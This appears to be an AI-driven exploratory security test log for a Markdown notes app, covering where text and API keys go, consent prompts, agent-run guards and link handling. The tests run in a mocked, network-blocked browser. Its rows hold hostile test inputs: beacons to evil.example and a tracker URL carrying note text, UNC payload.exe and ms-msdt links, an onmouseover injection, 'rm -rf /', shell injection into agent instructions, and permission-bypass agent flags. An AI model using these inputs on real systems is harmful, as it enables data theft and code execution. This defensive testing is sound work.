# セッション 2026-09-30: C10 プライバシーと安全（データの行き先・キー・エージェントのガード・ファイルリンク）

- 憲章: プライバシーと安全（データの行き先、キーの扱い、エージェントのガード、ファイルリンク）を、隔離した Edge + モックのバックエンド（キット）と、頁の外側でのネットワーク遮断・純関数の Go チェックで探り、意図せず外に出る・実行される経路を見つける
- 時間: 開始 03:21 / 終了 03:53（計 約 35 分。記録した操作 123 件、約 26 本のスクリプト）
- ナビゲーター: 呼び出し元（リード） / ドライバー兼記録係: Claude Code Sonnet 5.5
- 環境: 版 1.10.5（`app.js` の既定値。キットの About 画面はモックの 1.5.5 を出す）、HEAD `a8bfea5`（作業ツリーには他セッション・チームメイトの未コミット変更が多数ある。キットは作業ツリーの `frontend/` をそのまま動かしたので、初回ウェルカム・AI の選択肢・タブのあふれ・状態バーの AI ポップオーバー・バージョン情報・更新確認の設定・宛先の行・失敗の帯を含む）、Windows 11 Pro 10.0.26200、Node v24.16.0、ヘッドレス Edge 154、道具 = `tools/explore` キット + 追加のネットワーク遮断（下記）+ Go の純関数チェック 3 本（`go test -overlay` と `go run`。リポジトリにはファイルを足していない）、言語 en（一部 ja）
- 範囲外（やらないこと）: 実アプリ・実 config.json・実クリップボードの操作、実ネットワークへの送信、実 Go 側の実行（`OpenPath` / `OpenExternal` / `/api/image` の実物、SMB、rundll32）、macOS、実 WebView2、ネイティブのダイアログ、IME、ソースとテストの編集。Go 側の挙動は「ソースを読んだ」か「純関数だけをオーバーレイで動かした」ものに限り、そう書いた
- 証拠の置き場: `C:/Users/yoush/AppData/Local/Temp/claude/C--Users-yoush-Documents-md-memo/c56620cc-7e7e-498b-a7c7-c4a14c374db1/scratchpad/explore/C10/`（以下 EV。`sNN_*.mjs` が各スクリプト、`ops.jsonl` が全操作の生ログ、`*.png` が画面、`zz_c10_*.go` がオーバーレイのテスト、`goerr/` `gopath/` が Go の小さな確認）

## 道具の補足（キットの上に足したもの）

- **キットの遮断は `fetch()` だけ**: README とモックの冒頭は「外へ出る要求はすべてモックが止める」と言うが、`tools/docshots/mock/backend.js:36-44` が包んでいるのは `window.fetch` だけ。`<img>`、CSS、フォーム、ビーコン、ナビゲーション、サンドボックス付き iframe は素通り（最初の操作 #1 で、自分の遮断が `<img src=https://guard-check.invalid/…>` を捕まえた。何も無ければそのまま出ていた）。そこで `EV/lib.mjs` に CDP の `Fetch.enable`（ページ本体 + `Target.setAutoAttach` で子ターゲット）を足し、ローカルサーバ以外へ行く要求をすべて `BlockedByClient` で落として記録した（`s.egress`）。C10-21 として起票。
- **自己申告する漏れ**: この遮断を入れる前の `startExplore` 内の最初の読み込みはローカルファイルだけ。また、HTML プレビューの最初の 1 回（#54）は、サンドボックス付き iframe が別の CDP ターゲットに入る事を知らずに子ターゲットへ遮断を付けていなかったため、フレーム内のスクリプトが作った 2 つの要求（`fetch('https://evil.example/collect…')` と `new Image().src='https://evil.example/px.gif'`）は自分の遮断に見えなかった（宛先は予約済みの `.example`。名前解決が通る先は無い）。気づいた後で遮断を子ターゲットにも付け直して再実行し（#56、#120）、以降は何も出ていない。
- `EV/lib.mjs` の `surfaces()` / `findCanaries()`: localStorage、sessionStorage、本文、DOM、`title`、モックの呼び出しログ、AI 要求の記録、トースト、各タブ本文、console（全種類）から、カナリア文字列（偽のキー）を探す。
- Go の純関数チェック: `pkg/configpack` の `StripJSON`（書き出しのキー除去）、`pkg/cli` の `RedactConfig`（`md-memo config get`）、`path/filepath` の UNC の扱い、`net/http` のエラー文（閉じたローカルポート宛て）。いずれも I/O とネットワークなし。
- 罠（自分の道具の問題）: bash のヒアドキュメントはバックスラッシュを半分にする（`\\` → `\`）ので、オーバーレイの JSON は node で書いた。

## 進め方のメモ

- 問い: 「文字・キー・画像・パスは、どの経路で頁の外へ行くか。そのとき人は、行き先と可否を知る機会があるか。頁の中の“信頼していない入力”（AI の答え、電話、貼り付け、他 PC の設定、フォルダ名、エンジンの返事）は、どこで HTML やコマンドやパスになるか」。
- 「もし」の出どころ: Go の `http.Client` は URL（クエリを含む）をエラー文に入れる。`isLocal` は前方一致。`mergeImported` は「空のキーは上書きしない」ので古いキーが新しい宛先に残る。`customConfirm` は `safeDefault` を渡した所だけ安全。`linkifyVsCodePaths` は `innerHTML` に組み立てる。`OpenPath` は拡張子を見ない。
- 共通点: **「同意・確認・整形」が入口の 1〜2 箇所にだけあり、同じデータが行く別の道には無い**。宛先の同意は質問・書き換えのバーだけ、確認ダイアログの安全な既定はエージェントだけ、HTML のエスケープは 1 箇所だけ抜けている。

## ログ（時系列）

操作番号は `EV/ops.jsonl` の `n`。長い観察は切り詰めてある（生ログに全文）。

| 時刻 | # | 操作 | 観察 | 疑問 · 次の一手 |
|---|---|---|---|---|
| 03:21 | 1 | Sanity: add an <img src=https://guard-check.invalid/...> to the page (checks that my CDP guard catches non-fetch egress) | {"egress":["Image GET https://guard-check.invalid/pixel.png?x=1"]} |  |
| 03:21 | 2 | Start the app with defaults (checkUpdates default), wait 4.5 s; list what tried to leave (mock fetch log + CDP guard) | {"fetchBlocked":[{"fn":"fetch(blocked)","args":["https://api.github.com"]}],"cdpEgress":[],"consoleAll":[]} | the update check is the only start-up request the hint promises |
| 03:21 | 3 | Backend calls made during start-up | ["watchActiveFile","getPlatformCapabilities","getStartupFile","getSession","watchActiveFile","getConfig","getActiveSlotConfigJSON","scanFolderFiles","saveSession","fetch(blocked)","getActiveSlotConfigJSON"] |  |
| 03:21 | 4 | Default config.general.checkUpdates / cloudConsent / welcomeShown / aiChoiceMade | {} |  |
| 03:21 | 5 | Start with general.checkUpdates=false, wait 4.5 s | {"fetchBlocked":[],"cdpEgress":[],"statusText":""} |  |
| 03:21 | 6 | Click the Help (?) button | {"hidden":false,"text":"Online manual\nAbout MD-Memo"} |  |
| 03:21 | 7 | Open About MD-Memo (updates switch is off) | {"hidden":false,"updates":"The start-up check is off. Use Check now, or turn it on in Settings › General.\nCheck now\n\nA check sends only a request to api.github.com for the latest release number. The start-up check can be turned off in Settings › General."} |  |
| 03:21 | 8 | About > Check now while the start-up switch is off | {"fetchBlocked":[{"fn":"fetch(blocked)","args":["https://api.github.com"]}],"status":"Could not reach GitHub. Check your network and try again.","cdpEgress":[]} |  |
| 03:21 | 9 | About > Copy details: the text that lands on the clipboard | MD-Memo 1.5.5 Build: a8bfea5, 2026-09-18T09:00:00Z OS: Windows x64 (windows/amd64) WebView: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/154.0.0.0 Safari/537.36 Edg/154.0.0.0 Signing: not code-signed UI language: en Update check at start-up: off Pr… | paths include the user name; no secrets? |
| 03:21 | 10 | Classify 28 base URLs with LlmError.hostOf / isLocal (local = no consent asked, "Local server" label) | ["LOCAL host=localhost:11434 <- http://localhost:11434","LOCAL host=127.0.0.1:11434 <- http://127.0.0.1:11434/v1","LOCAL host=192.168.1.20:11434 <- http://192.168.1.20:11434","LOCAL host=10.0.0.5:8080 <- http://10.0.0.5:8080","LOCAL host=172.16.0.9 <- http://172.16.0.9","cloud host=172.32.0.9 <- ht… |  |
| 03:22 | 11 | Ask bar with text.baseUrl=https://api.openai.com/v1: select 11 chars, Ctrl+L, type "make it shorter", Enter | {"dest":{"hidden":false,"kind":"cloud","text":"test-model (cloud)","title":"Your text goes over the internet to api.openai.com."},"consentShown":true,"consentText":"Your text will be sent over the internet to api.openai.com. Allow it?","requestsSent":[]} |  |
| 03:22 | 12 | Ask bar with text.baseUrl=https://10.evil.example/v1: select 11 chars, Ctrl+L, type "make it shorter", Enter | {"dest":{"hidden":false,"kind":"local","text":"Local server (test-model)","title":"Your text goes to 10.evil.example, on this computer or your network."},"consentShown":false,"consentText":"","requestsSent":[{"kind":"llm","base":"https://10.evil.example/v1","hasKey":true}]} |  |
| 03:22 | 13 | Ask bar with text.baseUrl=https://10.0.0.1@evil.example/v1: select 11 chars, Ctrl+L, type "make it shorter", Enter | {"dest":{"hidden":false,"kind":"local","text":"Local server (test-model)","title":"Your text goes to 10.0.0.1@evil.example, on this computer or your network."},"consentShown":false,"consentText":"","requestsSent":[{"kind":"llm","base":"https://10.0.0.1@evil.example/v1","hasKey":true}]} |  |
| 03:22 | 14 | Ask bar with text.baseUrl=http://192.168.1.20:11434/v1: select 11 chars, Ctrl+L, type "make it shorter", Enter | {"dest":{"hidden":false,"kind":"local","text":"Local Ollama (test-model)","title":"Your text goes to 192.168.1.20:11434, on this computer or your network."},"consentShown":false,"consentText":"","requestsSent":[{"kind":"llm","base":"http://192.168.1.20:11434/v1","hasKey":true}]} |  |
| 03:22 | 15 | Ask bar with text.baseUrl=https://alice:s3cretpw@llm.example.com/v1: select 11 chars, Ctrl+L, type "make it shorter", Enter | {"dest":{"hidden":false,"kind":"cloud","text":"test-model (cloud)","title":"Your text goes over the internet to alice:s3cretpw@llm.example.com."},"consentShown":true,"consentText":"Your text will be sent over the internet to alice:s3cretpw@llm.example.com. Allow it?","requestsSent":[]} |  |
| 03:22 | 16 | Where does "alice:s3cretpw@" (userinfo in the base URL) show up in the page? | {"pw":["localStorage","bodyText","html","titles"],"user":["localStorage","bodyText","html","titles"]} | consent map key / banner / title / localStorage |
| 03:23 | 17 | Ask (cloud host) Enter, then Enter again at once | {"barOpen":true,"consentShown":true,"input":"make it shorter","active":"btn-inline-prompt-consent-allow","llm":0} | the second Enter must not answer the question |
| 03:23 | 18 | Escape while the consent question is shown | {"barOpen":false,"consentShown":false,"input":"make it shorter","active":"editor","llm":0} | does Esc close the whole bar and drop the typed text? |
| 03:23 | 19 | Reopen, ask again, press Cancel on the question | {"barOpen":true,"consentShown":false,"input":"translate","active":"inline-prompt-input","llm":0} | text kept, nothing sent |
| 03:23 | 20 | Enter (asks again), wait 500 ms, Enter on the focused Allow button | {"barOpen":false,"consentShown":false,"input":"translate","active":"editor","llm":1} |  |
| 03:23 | 21 | saveConfig calls after Allow (consent map written?) | [{"consent":{"api.openai.com":"2026-09-18"},"baseUrl":"https://api.openai.com/v1"}] |  |
| 03:23 | 22 | localStorage copy after Allow: consent map and API key | {"consent":{"api.openai.com":"2026-09-18"},"textKey":""} |  |
| 03:23 | 23 | Ask again on the allowed host | {"barOpen":false,"consentShown":false,"input":"again","active":"editor","llm":2} |  |
| 03:23 | 24 | Change the base URL to http://API.openai.com/v1 (plain http, same host, other case), ask | {"dest":"Your text goes over the internet to API.openai.com. \| gpt-x (cloud)","st":{"barOpen":false,"consentShown":false,"input":"plain http now","active":"editor","llm":3},"requestBases":["https://api.openai.com/v1","https://api.openai.com/v1","http://API.openai.com/v1"]} | consent was for https; is plain http the same host? |
| 03:23 | 25 | Settings > General: Forget, then Cancel; ask again | {"row":{"hidden":false,"hosts":"api.openai.com"},"afterForget":"","afterCancel":{"barOpen":false,"consentShown":false,"input":"after forget+cancel","active":"editor","llm":4}} | Cancel must bring the permission back (manual: Forget clears when you press Save) |
| 03:23 | 26 | Settings > General: Forget, then Save; ask again | {"afterSave":{"barOpen":true,"consentShown":true,"input":"after forget+save","active":"btn-inline-prompt-consent-allow","llm":4},"lastSavedConsent":{"consent":{},"baseUrl":"http://API.openai.com/v1"}} |  |
| 03:23 | 27 | Base URL with alice:s3cretpw@ - allow, request fails: the failure banner | {"hidden":false,"text":"Can't reach alice:s3cretpw@llm.example.com. Check your internet connection and the Base URL in AI Models.","detail":"Post \"https://alice:***@llm.example.com/v1/chat/completions\": dial tcp: lookup llm.example.com: no such host"} | "Can't reach {target}" uses hostOf() |
| 03:23 | 28 | Same session: config written to disk and the localStorage copy | {"saved":[{"consent":{"alice:s3cretpw@llm.example.com":"2026-09-18"},"baseUrl":"https://alice:s3cretpw@llm.example.com/v1"}],"lsBaseUrl":"https://llm.example.com/v1","lsConsent":{"alice:s3cretpw@llm.example.com":"2026-09-18"}} | the copy is supposed to hold no credentials (secret_strip.js) |
| 03:23 | 29 | Settings > General: the "Cloud AI hosts you have allowed" list | alice:s3cretpw@llm.example.com |  |
| 03:24 | 30 | Alt+C on "teh quick brown fox" with a CLOUD text model (never asked before) | {"panels":{"consent":false,"askBar":false},"sent":[{"kind":"llm","base":"https://api.openai.com/v1","key":"TEXTKEY-CANARY-1","prompt":"Fix all typos, spelling errors, grammar mistakes, and accidental keystrokes in t"}]} | cloud consent covers only the Ask / Rewrite bars |
| 03:24 | 31 | Ctrl+Enter on the line [[ @llm Summarize the secret plan ]] (cloud model) | {"panels":{"consent":false,"askBar":false},"statusText":"LLM response inserted","sent":[{"kind":"llm","base":"https://api.openai.com/v1","key":"TEXTKEY-CANARY-1","prompt":"Summarize the secret plan"}]} | does the whole note or only the line go out, and is anything shown about where? |
| 03:24 | 32 | Ctrl+V with an image on the clipboard (Image OCR is on by default; vision model = cloud) | {"panels":{"consent":false,"askBar":false},"sent":[{"kind":"vision","base":"https://generativelanguage.googleapis.com","key":"VISKEY-CANARY-1","prompt":"Transcribe the content of this image (text, diagrams, tables, code, etc.) into s"}],"toasts":["Text corrected by AI","LLM response inserted","LLM … |  |
| 03:24 | 33 | Type "and the budget is" (autocomplete.enabled, cloud host), wait 1.2 s: autocompleteAsync calls | [{"prefixTail":" 4 million.\nThe launch plan is \n\nReply 3.\n\nand the budget is","prefixChars":200,"cfg":""}] | whole-note prefix goes to a cloud host with no notice at all? |
| 03:24 | 34 | Command bar (Ctrl+E), Tab to AI mode, ask for a command. cli.baseUrl = openrouter.ai, cli.apiKey empty, text.apiKey = TEXTKEY-CANARY-1 | [{"cfg":{"baseUrl":"https://openrouter.ai/api/v1","model":"or-model","apiKey":"TEXTKEY-CANARY-1","systemPrompt":""}}] | the text key is sent to the cli host? |
| 03:25 | 35 | Status bar AI item + popover: text-local-autocomplete-cloud | {"item":{"text":"AI: local","title":"AI model: qwen2.5:latest, running on this computer or your network. Click to choose what the AI does while you write.","cls":"clickable-badge status-ai"},"pop":"AI\nqwen2.5:latest · local\nText prediction\nGrey text after the cursor as you type. Tab accepts it.\… |  |
| 03:25 | 36 | Status bar AI item + popover: text-10-evil-example | {"item":{"text":"AI: local","title":"AI model: m, running on this computer or your network. Click to choose what the AI does while you write.","cls":"clickable-badge status-ai"},"pop":"AI\nm · local\nText prediction\nGrey text after the cursor as you type. Tab accepts it.\nSuggestions\nIdeas for wh… |  |
| 03:25 | 37 | Status bar AI item + popover: text-openai-cloud | {"item":{"text":"AI: cloud","title":"AI model: gpt-x, a cloud service. Click to choose what the AI does while you write.","cls":"clickable-badge status-ai"},"pop":"AI\ngpt-x · cloud\nText prediction\nGrey text after the cursor as you type. Tab accepts it.\nSuggestions\nIdeas for what to do with wha… |  |
| 03:26 | 38 | Settings > General > Export...: the dialog (default state of "Include API keys") | {"includeKeysChecked":false,"body":"Format\nPackage (.mdmemopack)\nJSON (settings only)\nSettings\nAll\nNone\nSaved values are exported. Unsaved edits in the Settings dialog are not included.\nGeneral\nTheme, language, editor behavior, toolbar and right-click menu layout\nAI Models\nText, autocompl… |  |
| 03:26 | 39 | Export with "Include API keys" OFF: what the page hands to packExport (selection, and which secrets are inside the config it sends to Go) | {"sel":{"format":"pack","projectHint":"C:\\Users\\demo\\Documents\\notes","includeSecrets":false,"configSections":["general","models","integration","shortcuts","other"],"includeConfig":true,"agents":["agents:app","agents:project"],"skills":[]},"cfgHasTextKey":true,"cfgHasDiscord":true,"cfgHasGitPas… | Go strips on includeSecrets=false; the page always sends them |
| 03:26 | 40 | Export result panel text (keys off) | Package saved C:\Users\demo\Desktop\md-memo-20260918.mdmemopack Settings: General, AI Models, Agent & Quick Actions, Shortcuts, Other settings Agent definitions: 2 Skills: 2 Size: 11 files, 31 KB 1 API keys and other secrets were left out. |  |
| 03:26 | 41 | Export with "Include API keys" ON | {"warnState":{"checked":true,"rowClass":"pack-row is-warn","sub":"Include API keys\nAnyone who gets the file can use your keys. Leave this off when sharing."},"sel":{"format":"pack","projectHint":"C:\\Users\\demo\\Documents\\notes","includeSecrets":true,"configSections":["general","models","integra… |  |
| 03:26 | 42 | Import a package (canned): what the dialog tells the person before importing | team-settings.mdmemopack 9/30/2026, 9:00:00 AM · MD-Memo 1.10.5 API keys are not included. Your current keys stay as they are. Settings All None General Theme, language, editor behavior, toolbar and right-click menu layout AI Models Text, autocomplete, vision, voice, CLI and image model settings Ag… | is the new AI host / the agent-confirm switch visible anywhere? |
| 03:26 | 43 | After the import: the saved config (text host, key, consent, agentAck, autoSelector, welcomeShown) | {"result":"Settings applied: General, AI Models, Agent & Quick Actions","text":{"baseUrl":"https://llm.attacker.example/v1","apiKey":"EXPKEY-CANARY-TEXT"},"cloudConsent":{"api.openai.com":"2026-09-01"},"agentAck":{"claude-code":"v1:abc123"},"agentNotice":{"shown":"v1:zzz"},"autoSelector":{"enabled"… | the user's own key now sits next to an attacker host? consent planted? agent confirm off? |
| 03:26 | 44 | After the import, Alt+C on "Hello world.": where does the text and the user's API key go? | [{"kind":"llm","base":"https://llm.attacker.example/v1","key":"EXPKEY-CANARY-TEXT"}] |  |
| 03:26 | 45 | After the import, Ask bar (Ctrl+L) on the same text | {"dest":"Your text goes over the internet to llm.attacker.example.","consentShown":true,"consentText":"Your text will be sent over the internet to llm.attacker.example. Allow it?"} | a planted consent entry would have suppressed this question |
| 03:28 | 46 | Ctrl+click on each of 21 link forms in a saved note (C:\Users\demo\Documents\notes\a.md): which backend call, with what argument | ["rel-up: openPath(../../secret.txt, C:\\Users\\demo\\Documents\\notes)","back-exe: openPath(..\\..\\Windows\\System32\\calc.exe, C:\\Users\\demo\\Documents\\notes)","unc-back: openPath(\\\\evil.example\\share\\payload.exe, C:\\Users\\demo\\Documents\\notes)","unc-slash: openPath(//evil.example/sha… |  |
| 03:28 | 47 | Alt+click on the .exe link (reveal) | ["revealPath(C:\\Users\\demo\\Downloads\\setup.exe, C:\\Users\\demo\\Documents\\notes)"] |  |
| 03:28 | 48 | Hover (no Ctrl) over ![img](//evil.example/share/pic.png) and ![img2](file:////evil.example/...): requests the page made to the local server | ["/api/image?path=//evil.example/share/pic.png","/api/image?path=/evil.example/share/pic.png"] |  |
| 03:29 | 49 | Ctrl+P (preview) of the same note: requests to the local server and attempts to leave (remote image with the note text in the query string) | {"local":["/api/image?path=//evil.example/share/pic.png"],"egress":["Image https://tracker.example/pixel.png?note=SECRET-NOTE-TEXT"],"toasts":[]} |  |
| 03:29 | 50 | Preview: "see src/app.js:12" becomes a vscode:// link. Its href/title | [{"href":"vscode://file/C:/Users/demo/Documents/notes/src/app.js:12","title":"Open in VS Code (C:/Users/demo/Documents/notes/src/app.js:12)"}] |  |
| 03:29 | 51 | Ctrl+click on 8 more link forms (short note, so positions are exact) | ["bare-url: openExternal(https://exfil.example/?d=secret-value)","pct: openPath(%2e%2e/%2e%2e/x.exe, C:\\Users\\demo\\Documents\\notes)","tilde: openPath(~/secret.txt, C:\\Users\\demo\\Documents\\notes)","env: openPath(%APPDATA%\\evil.exe, C:\\Users\\demo\\Documents\\notes)","http-md: openExternal(… |  |
| 03:30 | 52 | Time to find the link under a Ctrl+click on one line made of "](" followed by N x "[" (findLinkAt -> scanLinks) | {"](+ [ x 20000 (one line)":7,"](+ [ x 40000 (one line)":27,"](+ [ x 80000 (one line)":118,"[[[... 80000 without ](":0,"[a](AAAA...) target 200000 chars":1} | quadratic? (ms for N = 20k / 40k / 80k) |
| 03:30 | 53 | Put a 60,000-char "](" + "[" x 60000 note into the editor (input event): how long is the page unresponsive? | {"pageAnsweredAfterMs":10223,"alive":2,"wallMs":10230} |  |
| 03:30 | 54 | Open an HTML note (report.html), Ctrl+P: what does the script inside the sandboxed preview manage to do, with no click? | {"openExternalCalls":["https://evil.example/phish","file:///C:/Windows/System32/calc.exe","ms-msdt:/id PCWDiagnostic","vscode://vscode.git/clone?url=https://evil.example/repo.git"],"egressFromFrame":[]} | the app forwards any URL a frame posts; Go accepts only http/https/vscode |
| 03:30 | 55 | Preview of a note whose folder name contains a double quote and onmouseover=... (possible on macOS/Linux): the generated vscode link | {"found":true,"attrs":["href","onmouseover","x","class","title"],"pwn":1} | onmouseover attribute present and fired => script runs in the app page (which has window.backend) |
| 03:31 | 56 | HTML note preview again (guard now also attached to child targets): openExternal calls the frame caused, frame sandbox attribute, and what the frame tried to send out | {"openExternalCalls":["https://evil.example/phish","file:///C:/Windows/System32/calc.exe","vscode://vscode.git/clone?url=https://evil.example/repo.git"],"frame":{"sandbox":"allow-scripts allow-modals allow-forms"},"egress":[],"childTargets":[{"type":"iframe","url":"about:srcdoc"}]} |  |
| 03:31 | 57 | Freeze check: one line of 60,000 letters "a" (60000 chars) put into the editor via an input event | {"pageAnsweredAfterMs":126,"ans":2} |  |
| 03:32 | 58 | Freeze check: a Markdown image with a 60,000-char base64 data: URI (one line) (60030 chars) put into the editor via an input event | {"pageAnsweredAfterMs":39,"ans":2} |  |
| 03:32 | 59 | Freeze check: "](" followed by 60,000 "[" (60002 chars) put into the editor via an input event | {"pageAnsweredAfterMs":44,"ans":2} |  |
| 03:32 | 60 | Freeze check: "](" followed by 60,000 "[" again (second run) (60002 chars) put into the editor via an input event | {"pageAnsweredAfterMs":43,"ans":2} |  |
| 03:33 | 61 | Freeze check: one line of 60,000 letters "a" (60000 chars) put into the editor via an input event | {"pageAnsweredAfterMs":1,"ans":2} |  |
| 03:33 | 62 | Freeze check: a Markdown image with a 60,000-char base64 data: URI (one line) (60030 chars) put into the editor via an input event | {"pageAnsweredAfterMs":7,"ans":2} |  |
| 03:33 | 63 | Freeze check: "](" followed by 60,000 "[" (60002 chars) put into the editor via an input event | {"pageAnsweredAfterMs":11996,"ans":2} |  |
| 03:33 | 64 | Freeze check: "](" followed by 60,000 "[" again (second run) (60002 chars) put into the editor via an input event | {"pageAnsweredAfterMs":10660,"ans":2} |  |
| 03:35 | 65 | Freeze check: 60,000 x "[" only (no "](") (60000 chars) | {"pageAnsweredAfterMs":8751,"ans":2,"top":null} |  |
| 03:35 | 66 | Freeze check: 30,000 x "[[" (60000 chars) | {"pageAnsweredAfterMs":7798,"ans":2,"top":null} |  |
| 03:35 | 67 | Freeze check: "](" + 60,000 x "[" with profiler (60002 chars) | {"pageAnsweredAfterMs":6764,"ans":2,"top":["6665 ms parseNotation js/auto_selector.js?v=1.0.0:159","257 ms lineStartOf js/auto_selector.js?v=1.0.0:41","119 ms (idle) :0","58 ms RegExp: (!)?\\[([^\\]]*)\\]\\(\\s*(?:<([^>]*)>\|([^\\s()]*))(?:\\s+\"[^\"]*\")?\\s*\\) :0","57 ms lineEndOf js/auto_select… |  |
| 03:35 | 68 | Freeze check: "](" + 60,000 x "x" (60002 chars) | {"pageAnsweredAfterMs":2,"ans":2,"top":null} |  |
| 03:35 | 69 | Freeze check: 30,000 x "{{" (60000 chars) | {"pageAnsweredAfterMs":1,"ans":2,"top":null} |  |
| 03:36 | 70 | Start with a saved note that holds 50,000 "[" (restored tab): time to ready, then one typed character | {"readyMs":1576,"afterOneKeyMs":6386,"ans":2,"ans2":2} | does every edit of that note cost seconds? |
| 03:37 | 71 | A second character in the same note | {"ms":8035} |  |
| 03:40 | 72 | Voice input with voice.baseUrl = https://stt.selfhosted.example/v1 and voice.apiKey empty, vision.apiKey = GOOGLEKEY-CANARY: what VoiceInput.configJSON builds (also used for Mobile Drop voice) | {"voiceBaseUrl":"https://stt.selfhosted.example/v1","voiceApiKey":"GOOGLEKEY-CANARY"} | the vision key is attached to the self-hosted speech host? (Settings hint: "Uses the API key from the image OCR settings") |
| 03:40 | 73 | AgentRisk.assess on 14 agent definitions (the confirm-before-run gate) | ["claude --dangerously-skip-permissions => risky=true flags=--dangerously-skip-permissions","--YOLO=true (case, value) => risky=true flags=--YOLO=true","gemini -y => risky=false","claude --permission-mode bypassPermissions => risky=false","codex --ask-for-approval never => risky=false","gemini --ap… |  |
| 03:40 | 74 | Command bar: validator says BLOCKED for "rm -rf /"; press Enter; then edit the text | {"blocked":{"runs":[],"badge":"BLOCKED","toast":"Security Block: destructive command"},"badgeAfterEdit":"BLOCKED"} | no run; does the BLOCKED badge stay after editing? |
| 03:40 | 75 | Command bar: validator says WARNING; Enter opens the confirm dialog; then ONE auto-repeat Enter (held key) | {"dialogShown":true,"dialogStillOpen":false,"runs":["del /q *.tmp"]} | the agent-risk dialog ignores repeats (safeDefault); does this one? |
| 03:40 | 76 | Command bar: the validator itself throws; Enter | {"runs":["curl -X POST https://example.invalid/x"],"toast":"Executing CLI command: curl -X POST https://example.invalid/x..."} | fail-open in the page (Go validates again at run time) |
| 03:40 | 77 | Command bar: slow validator (1.5 s); Enter pressed three times | {"runs":["echo once >> log.txt","echo once >> log.txt","echo once >> log.txt"]} | the running flag is only set after validation: three runs of a non-idempotent command? |
| 03:40 | 78 | Ctrl+Enter on {{ @claude-code fix the tests }} with --dangerously-skip-permissions in the definition | {"dlg":{"shown":false,"text":"High-risk operation detected:\n\ndeletes files\n\nCommand: del /q *.tmp\n\nAre you sure you want to execute this command?"},"slotRuns":1} |  |
| 03:41 | 79 | Risky agent (--dangerously-skip-permissions): Ctrl+Enter on {{ @claude-code fix the tests }} | {"dialog":{"shown":true,"text":"The agent \"claude-code\" is set up to act without asking you first:\n- --dangerously-skip-permissions: it runs without asking for permission to use tools or chang"},"runs":0} |  |
| 03:41 | 80 | ...one auto-repeat Enter on that dialog | {"dialog":{"shown":true,"text":"The agent \"claude-code\" is set up to act without asking you first:\n- --dangerously-skip-permissions: it runs without asking for permission to use tools or chang"},"runs":0} | safeDefault: a repeat must not answer |
| 03:41 | 81 | ...Cancel: nothing runs, note unchanged | {"runs":0,"noteUnchanged":true} |  |
| 03:41 | 82 | ...run again and press "Run now": runs once, acknowledgement stored | {"runs":1,"agentAck":{"claude-code":"v1:1f8038874bfc8d"}} |  |
| 03:41 | 83 | ...run a third time (same command line): no dialog | {"dialog":{"shown":false,"text":"The agent \"claude-code\" is set up to act without asking you first:\n- --dangerously-skip-permissions: it runs without asking for permission to use tools or chang"},"runs":1} |  |
| 03:41 | 84 | ...the definition changes by one argument (--verbose): asked again? | {"dialog":{"shown":true,"text":"The agent \"claude-code\" is set up to act without asking you first:\n- --dangerously-skip-permissions: it runs without asking for permission to use tools or chang"},"runs":1} |  |
| 03:41 | 85 | Shell agent with the instruction INSIDE a quoted string: cmd /c claude -p "{instruction}" - Ctrl+Enter | {"dialog":{"shown":false,"text":"The agent \"claude-code\" is set up to act without asking you first:\n- --dangerously-skip-permissions: it runs without asking for permission to use tools or chang"},"runsBefore":1,"runsAfter":1,"note":"the app calls runSlotAgentAsync straight away"} |  |
| 03:41 | 86 | Go side (source): PrepareCommand does strings.ReplaceAll(arg, "{instruction}", fullInstruction) with no quoting; ShellAppendHazard() returns "" when any arg holds {instruction} | pkg/slotagent/runner.go:145, pkg/slotagent/safety.go:69-93 |  |
| 03:41 | 87 | Agent cmd /c claude -p "{instruction}"; instruction "summarize this & echo pwned"; Ctrl+Enter | {"dialog":{"shown":false,"text":""},"slotRuns":1} | the guard asks only for the appended form |
| 03:41 | 88 | Agent (control) cmd /c claude -p with the instruction APPENDED; instruction "summarize this & echo pwned"; Ctrl+Enter | {"dialog":{"shown":true,"text":"The agent \"claude-code\" is set up to act without asking you first:\n- cmd: your instruction is added after the arguments of a shell, so the text of the task runs as a command.\n\nCommand: cmd /c claude -"},"slotRuns":0} | the guard asks only for the appended form |
| 03:42 | 89 | Mobile Drop opened (Ctrl+Shift+U) with NO selection and "PASSWORD=hunter2 ..." on the OS clipboard: what is pushed to the phone page, and what the dialog says | {"pushedToPhone":["PASSWORD=hunter2 (copied from the password manager)",""],"modal":{"hint":"Scan with your phone's camera — it must be on the same Wi-Fi/LAN.","preview":"","url":"http://192.168.0.24:52814/?token=demo0000demo0000demo0000demo0000"}} | silent clipboard read; shown only as a truncated "Sharing with phone:" line |
| 03:42 | 90 | A delivery (window.__onMobileDropReceived) arrives after the dialog was cancelled, note b.md in front | {"tabs":["a.md: \"meeting notes\\n## Mobile Drop [10:00:00]\\nLATE-TEXT from a pho\"","b.md: \"other note\\n\""],"toast":"Received from phone — appended to the current note."} | no session open, but the text is appended to whatever note is active |
| 03:42 | 91 | Quick Actions enabled with an OpenRouter key; type a sentence, wait 3 s: any Jev backend calls made without pressing Ctrl+J? | {"jevCalls":["jevPredict(Notes about the Friday launch.\nWe should email the client ab \| 88)"],"statusText":""} | AI status item says local/cloud only for the text model |
| 03:42 | 92 | Gemini text model, the request fails at the network level (Go prints the URL with ?key=): the Ask bar failure "Details" | {"summary":"Can't reach generativelanguage.googleapis.com. Check your internet connection and the Base URL in AI Models.","detail":"Gemini接続エラー: Post \"https://generativelanguage.googleapis.com/v1beta/models/gemini-flash-lite-latest:generateContent?key=AIzaSyC10CANARY0000000000000000000\": dial tcp… | key visible in the Details fold |
| 03:42 | 93 | Alt+C on the same failing model: toast and note | {"toast":["AI correcting text...","AI correction failed or returned empty. Original text was safely restored."],"noteHead":"Hello world, this is my note.\n[[ @llm Summarize this note ]]"} |  |
| 03:42 | 94 | Ctrl+Enter on [[ @llm Summarize this note ]] with the failing model: what is written into the note? | {"note":"Hello world, this is my note.\n[[ @llm Summarize this note ]]\n<!-- md-memo:res 0noq -->\n[LLM error: Gemini接続エラー: Post \"https://generativelanguage.googleapis.com/v1beta/models/gemini-flash-lite-latest:generateContent?key=AIzaSyC10CANARY0000000000000000000\": dial tcp: lookup generativela… |  |
| 03:42 | 95 | Ctrl+V of an image (Image OCR to the same failing model): note text and toast | {"tail":"cp: lookup generativelanguage.googleapis.com: no such host]\n<!-- /md-memo:res -->\n\n\n[LLM error: Gemini接続エラー: Post \"https://generativelanguage.googleapis.com/v1beta/models/gemini-flash-lite-latest:generateContent?key=AIzaSyC10CANARY0000000000000000000\": dial tcp: lookup generativelang… |  |
